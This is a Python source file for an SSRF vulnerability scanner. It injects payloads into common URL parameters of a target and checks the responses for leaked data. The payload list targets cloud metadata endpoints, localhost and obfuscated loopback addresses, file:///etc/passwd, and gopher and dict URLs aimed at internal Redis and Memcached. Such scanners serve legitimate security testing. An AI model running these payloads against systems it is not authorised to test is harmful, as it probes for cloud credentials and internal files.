import requests
import time
import logging
from urllib.parse import urlencode

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1.json",
    "http://127.0.0.1:80", "http://localhost:22", 
    "http://0.0.0.0:80", "http://[::]:80",
    "http://2130706433/",
    "http://127.1/",
    "file:///etc/passwd", 
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/"
]

TARGET_PARAMS = ["url", "link", "target", "dest", "redirect", "source", "data", "callback", "image", "uri"]

def scan_ssrf(url: str) -> bool:
    """
    Сканирует на наличие SSRF уязвимостей.
    Возвращает True, если найдено.
    """
    print(f"🔍 SSRF scan: {url}")
    target_url = url.split('?')[0]
    found = False

    if '?' not in url:
        params_to_test = TARGET_PARAMS
    else:
        params_to_test = TARGET_PARAMS

    for param in params_to_test:
        if found: break
        
        quick_payloads = [SSRF_PAYLOADS[0], SSRF_PAYLOADS[4]]
        
        for payload in quick_payloads:
            query = {param: payload}
            test_url = f"{target_url}?{urlencode(query)}"
            
            try:
                start = time.time()
                r = requests.get(test_url, timeout=3, allow_redirects=True) 
                duration = time.time() - start
                
                text = r.text.lower()
                
                if "ami-id" in text or "instance-id" in text or "computeMetadata" in text:
                    print(f"  🔴 HIT: Cloud Metadata leak via {param}={payload}")
                    found = True
                    break
                    
                if "ssh-2.0" in text or "openssh" in text:
                    print(f"  🔴 HIT: Internal SSH banner via {param}={payload}")
                    found = True
                    break
                    
                if "root:x:0:0" in text:
                    print(f"  🔴 HIT: /etc/passwd leak via {param}={payload}")
                    found = True
                    break
                    
                if duration > 2.5 and r.status_code != 404:
                     print(f"  ⚠️ Suspicious delay ({duration:.1f}s) at {param}")
            
            except requests.Timeout:
                 print(f"  ⚠️ Timeout (Blind SSRF candidate): {param}")
            except:
                pass

    if found:
        print("🟡 SSRF vulnerabilities found!")
        return True
    
    print("🟢 SSRF clean")
    return False
